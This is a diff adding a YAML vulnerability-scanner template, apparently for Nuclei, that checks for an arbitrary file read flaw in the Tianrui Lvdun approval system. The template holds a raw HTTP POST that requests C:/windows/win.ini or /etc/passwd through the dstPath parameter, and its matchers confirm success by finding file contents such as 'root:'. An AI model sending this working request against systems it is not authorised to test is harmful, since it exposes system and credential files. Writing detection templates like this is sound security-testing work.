@@ -1,0 +1,47 @@
+id: poc-yaml-tipray-gsas-file-anyfile-read
+
+info:
+  name: Tianrui Lvdun Approval System Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+variables:
+  paths:
+    - "C:/windows/win.ini"
+    - "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/file/downFileByconfirm.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dstPath={{paths}}&fileName=1.png&processInstanceIds=
+    payloads:
+      paths:
+        - '{{paths}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
+          - "filename="
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "root:"
+          - "/bin"
+          - "[files]"
+          - "bit app support"
